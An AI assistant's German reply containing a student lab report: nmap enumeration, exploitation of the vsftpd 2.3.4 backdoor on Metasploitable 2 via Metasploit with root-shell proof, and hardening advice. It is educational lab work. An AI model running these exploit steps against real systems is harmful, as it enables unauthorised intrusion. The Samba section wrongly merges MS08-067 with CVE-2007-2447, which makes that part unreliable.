Ich habe eine ausführliche, professionelle und vollständig strukturierte Dokumentation auf Basis deines Arbeitsauftrags (M182: Enumeration, Fingerprinting, Exploitation & Resilienzanalyse) im Markdown-Format (`.md`) erstellt und als PDF-Datei exportiert.

Da du eine **komplette Doku** im Markdown-Format angefragt hast, findest du nachfolgend den **vollständigen Markdown-Text**, den du direkt als `.md`-Datei kopieren und speichern kannst, sowie den Download der fertig gestalteten PDF-Datei.

---

### Download der PDF-Version

[file-tag: M182_Dokumentation_Enumeration_Exploitation.pdf]

---

### Vollständiger Markdown-Code (`DOKUMENTATION.md`)

```markdown
# Modul 182: Dokumentation – Enumeration, Fingerprinting & Exploitation

**Modul:** M182 – Schutzbedarfsanalyse und Sicherheitsszenarien  
**Kompetenz:** A1A (Beurteilen)  
**Autor:** [Dein Vorname Nachname]  
**Datum:** 24. August 2026  
**Status:** Inhalts- & Prozessdokumentation (Laborumgebung)  

---

## Inhaltsverzeichnis
1. [Einleitung & Zielsetzung](#1-einleitung--zielsetzung)
2. [Code of Conduct & Rechtliche Rahmenbedingungen](#2-code-of-conduct--rechtliche-rahmenbedingungen)
3. [Aufbau der Lab-Umgebung](#3-aufbau-der-lab-umgebung)
4. [Phase 1: Enumeration & Fingerprinting](#4-phase-1-enumeration--fingerprinting)
   - [4.1 Host Discovery (Netzwerkscan)](#41-host-discovery-netzwerkscan)
   - [4.2 TCP Port-Scanning (SYN-Stealth-Scan)](#42-tcp-port-scanning-syn-stealth-scan)
   - [4.3 Service- & Betriebssystem-Erkennung (OS Fingerprinting)](#43-service---betriebssystem-erkennung-os-fingerprinting)
   - [4.4 UDP Port-Scanning & Analyse](#44-udp-port-scanning--analyse)
   - [4.5 Zusammenfassung der identifizierten Dienste](#45-zusammenfassung-der-identifizierten-dienste)
5. [Phase 2: Schwachstellenanalyse & Exploit-Recherche](#5-phase-2-schwachstellenanalyse--exploit-recherche)
   - [5.1 Option 1: VSFTPD v2.3.4 Backdoor RCE](#51-option-1-vsftpd-v234-backdoor-rce)
   - [5.2 Option 2: Samba MS08-067 / netapi Remote Code Execution](#52-option-2-samba-ms08-067--netapi-remote-code-execution)
6. [Phase 3: Durchführung des Exploits](#6-phase-3-durchführung-des-exploits)
   - [6.1 Vorbereitung & Ausführung (VSFTPD v2.3.4)](#61-vorbereitung--ausführung-vsftpd-v234)
   - [6.2 Nachweis der Übernahme (Proof of Concept)](#62-nachweis-der-übernahme-proof-of-concept)
7. [Phase 4: Resilienzanalyse & Härtungsmassnahmen](#7-phase-4-resilienzanalyse--härtungsmassnahmen)
8. [Quellenverzeichnis](#8-quellenverzeichnis)

---

## 1. Einleitung & Zielsetzung

Ziel dieser Arbeit ist die systematische Durchführung und Dokumentation einer Schwachstellenbewertung (Vulnerability Assessment) sowie eines kontrollierten Penetrationstests in einer isolierten Laborumgebung. 

Anhand der Zielplattform **Metasploitable 2** werden die Phasen der Informationsbeschaffung (Enumeration), Identifikation von Diensten und Betriebssystemen (Fingerprinting), Schwachstellenrecherche (OSVDB/CVE) sowie die praktische Ausnutzung (Exploitation) mittels Kali Linux vollzogen. Den Abschluss bildet eine Resilienzanalyse mit konkreten Härtungsmassnahmen zur Prävention solcher Angriffsszenarien.

---

## 2. Code of Conduct & Rechtliche Rahmenbedingungen

Sicherheitsanalysen und Penetrationstests greifen tief in IT-Infrastrukturen ein. Um rechtliche Konsequenzen zu vermeiden und ethische Standards einzuhalten, wurden folgende Regeln strikt beachtet:

- **Vorabklärung & Autorisierung:** Sämtliche Aktivitäten beschränken sich ausschließlich auf die dafür vorgesehene, isolierte Lab-Infrastruktur.
- **Informationspflicht & Freigabe:** Es werden keine externen Netze oder nicht freigegebene Zielsysteme gescannt oder angegriffen.
- **Schadensvermeidung:** Die eingesetzten Exploits werden kontrolliert ausgeführt, um Störungen oder Datenverluste auf Host-Systemen zu verhindern.
- **Einhaltung des Verhaltenskodex:** Orientierung am *Ethical Hacking Code of Ethics*.

---

## 3. Aufbau der Lab-Umgebung

Für die Durchführung wird ein virtuelles Netz (Host-Only / Internal Network) eingesetzt:

- **Angriffssystem:** Kali Linux VM (`172.16.17.10`)
- **Zielsystem:** Metasploitable 2 VM (`172.16.17.135`)
- **Subnetz:** `172.16.17.0/24`


```

+-----------------------+                  +-----------------------+
|      Kali Linux       |                  |    Metasploitable 2   |
|    (Angriffssystem)   | <--------------> |      (Zielsystem)     |
|  IP: 172.16.17.10/24  |   Lab-Netzwerk   | IP: 172.16.17.135/24  |
+-----------------------+                  +-----------------------+

```

---

## 4. Phase 1: Enumeration & Fingerprinting

### 4.1 Host Discovery (Netzwerkscan)
Zur Feststellung aller aktiven Systeme im IP-Bereich `172.16.17.0/24` wird ein ARP/Ping-Sweep durchgeführt.

```bash
nmap -sn 172.16.17.0/24

```

**Ergebnis:**

* Host `172.16.17.135` antwortet auf ICMP/ARP-Anfragen und wird als Zielsystem identifiziert.

---

### 4.2 TCP Port-Scanning (SYN-Stealth-Scan)

Ein SYN-Scan (`-sS`) prüft die Port-Zustände, ohne den TCP-3-Wege-Handshake vollständig abzuschließen. Dies gilt als ressourcenschonend und verringert Log-Einträge bei einfachen Diensten.

```bash
sudo nmap -sS -p- 172.16.17.135

```

**Funktionsweise SYN-Scan:**

1. **Client -> Ziel:** `SYN`
2. **Ziel -> Client:** `SYN-ACK` (Port offen)
3. **Client -> Ziel:** `RST` (Verbindung wird sofort abgebrochen, kein `ACK`)

---

### 4.3 Service- & Betriebssystem-Erkennung (OS Fingerprinting)

Um die spezifischen Dienstversionen und das Betriebssystem zu bestimmen, werden Banner-Grabbing und TCP/IP-Stack-Analysen durchgeführt.

```bash
sudo nmap -sV -O -p 21,22,23,80,139,445 172.16.17.135

```

**Ergebnis Fingerprinting:**

* **OS-Guess:** Linux 2.6.9 - 2.6.33
* **Dienste:** OpenSSH, Apache HTTPD, vsftpd, Samba

---

### 4.4 UDP Port-Scanning & Analyse

Da UDP verbindungslos ist, erfolgt die Analyse über das Ausbleiben von ICMP-Nachrichten (`ICMP Port Unreachable`).

```bash
sudo nmap -sU --top-ports 20 172.16.17.135

```

**Identifizierte UDP-Dienste:**

| Port | Status | Dienst | Beschreibung |
| --- | --- | --- | --- |
| `53/udp` | open | domain | DNS Server |
| `111/udp` | open | rpcbind | RPC Portmapper |
| `137/udp` | open | netbios-ns | NetBIOS Name Service |
| `2049/udp` | open | nfs | Network File System |

*Hinweis zu UDP-Scans:* Durch Firewalls geblockte ICMP-Antworten können fälschlicherweise als `open|filtered` angezeigt werden (False Positives).

---

### 4.5 Zusammenfassung der identifizierten Dienste

| Port / Proto | Dienst | Software & Version | Potenzielle Analyse |
| --- | --- | --- | --- |
| `21/tcp` | FTP | vsftpd 2.3.4 | Bekannte Backdoor in Version 2.3.4 |
| `22/tcp` | SSH | OpenSSH 4.7p1 | Veraltete Krypto-Suites, Brute-Force |
| `23/tcp` | Telnet | Linux telnetd | Unverschlüsselte Klartextübertragung |
| `80/tcp` | HTTP | Apache httpd 2.2.8 | Veralteter Webserver, PHP-Skripte |
| `139/445/tcp` | SMB | Samba 3.0.20-Debian | MS08-067 / Command Injection |

---

## 5. Phase 2: Schwachstellenanalyse & Exploit-Recherche

Basierend auf den ermittelten Versionsnummern wurden zwei Angriffsvektoren ausgewählt:

### 5.1 Option 1: VSFTPD v2.3.4 Backdoor RCE

* **CVE-ID:** CVE-2011-2523
* **Beschreibung:** Im Juli 2011 wurde der Quellcode von vsftpd v2.3.4 von Unbekannten kompromittiert. Wenn bei der Anmeldung ein Benutzername mit dem Smiley-Kürzel `:)` eingegeben wird, öffnet der Server eine Root-Shell auf Port `6200/tcp`.
* **Auswirkung:** Vollständige Systemübernahme mit Root-Rechten.

---

### 5.2 Option 2: Samba MS08-067 / netapi Remote Code Execution

* **CVE-ID:** CVE-2008-4250 / CVE-2007-2447 (`usermap_script`)
* **Beschreibung:** Über eine Schwachstelle in der Verarbeitung von Benutzereingaben beim MS-RPC / Samba-Dienst kann beliebiger Shell-Code injiziert werden.
* **Auswirkung:** Remote Code Execution (RCE) als System/Root-Benutzer.

---

## 6. Phase 3: Durchführung des Exploits

Für die praktische Demonstration wird **Option 1 (VSFTPD v2.3.4 Backdoor)** ausgewählt.

### 6.1 Vorbereitung & Ausführung (VSFTPD v2.3.4)

1. **Metasploit Console starten:**
```bash
msfconsole

```


2. **Exploit-Modul auswählen & konfigurieren:**
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.16.17.135
show options

```


3. **Exploit ausführen:**
```bash
exploit

```



---

### 6.2 Nachweis der Übernahme (Proof of Concept)

Nach erfolgreichem Ausführen öffnet Metasploit eine interaktive Command-Shell. Die Identität wird durch Befehlseingaben bestätigt:

```bash
# Befehlseingabe zur Rechteprüfung:
id
# Ausgabe: uid=0(root) gid=0(root) groups=0(root)

# Hostname und Kernel auslesen:
uname -a
# Ausgabe: Linux metasploitable 2.6.24-16-server #1 SMP ... i686 GNU/Linux

# Netzwerkkonfiguration bestätigen:
ifconfig eth0
# Ausgabe: inet addr:172.16.17.135 Bcast:172.16.17.255 Mask:255.255.255.0

```

**Ergebnis:** Das Zielsystem wurde erfolgreich kompromittiert. Es besteht vollständiger Root-Zugriff.

---

## 7. Phase 4: Resilienzanalyse & Härtungsmassnahmen

Um ein System gegen derartige Angriffe abzusichern, müssen organisatorische und technische Massnahmen umgesetzt werden:

1. **Patch- & Patch-Management (Update-Strategie):**
* **Problem:** Einsatz veralteter Software-Releases mit bekannten Schwachstellen.
* **Massnahme:** Einrichten eines geregelten Update-Prozesses. Ersetzen von `vsftpd 2.3.4` durch eine gepatchte, aktuelle Version oder Wechsel auf eine gepflegte Alternative.


2. **Prinzip der minimalen Rechte & Deaktivierung unnötiger Dienste:**
* **Problem:** Dienste wie Telnet (`23/tcp`) oder ungesicherte FTP-Server laufen mit zu hohen Privilegien.
* **Massnahme:** Abschalten nicht benötigter Ports/Dienste. Ersetzen von unverschlüsselten Protokollen (Telnet/FTP) durch sichere Alternativen (SSH/SFTP).


3. **Netzwerksegmentierung & Intrusion Detection / Prevention (IDS/IPS):**
* **Problem:** Unbeschränkter Zugriff aus dem Netzwerk auf kritische Ports.
* **Massnahme:** Einsatz einer Host- und Network-Firewall (z. B. `iptables` / `ufw`), Beschränkung des Zugriffs auf administrative Ports via Management-VLAN sowie Implementierung eines IDS/IPS (z. B. Snort/Suricata) zur Erkennung von Signaturen bekannter Exploits.



---

## 8. Quellenverzeichnis

1. **Nmap Network Scanning:** Official Nmap Project Guide. URL: https://nmap.org/book/
2. **Rapid7 Metasploitable 2 Exploitability Guide:** URL: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide
3. **NVD - CVE-2011-2523 Detail (vsftpd v2.3.4):** National Vulnerability Database. URL: https://nvd.nist.gov/vuln/detail/CVE-2011-2523
4. **Ethical Hacking Code of Ethics:** Panmore Institute. URL: https://panmore.com/ethical-hacking-code-of-ethics-security-risk-issues

```

```